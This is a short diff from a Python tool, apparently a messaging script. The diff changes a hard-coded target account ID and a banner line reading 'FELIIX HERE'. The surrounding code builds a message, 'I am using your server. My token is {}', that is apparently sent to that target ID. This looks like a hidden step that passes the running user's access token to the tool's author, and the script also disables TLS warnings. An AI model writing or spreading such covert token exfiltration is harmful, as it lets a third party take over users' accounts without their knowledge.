@@ -42,12 +42,12 @@ def send_initial_message():
       msg_template = "HeLLo feliix SīīR! I am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61574890077316"
+      target_id = "61571059542672"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────FELIIX HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────FELIIX HERE───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
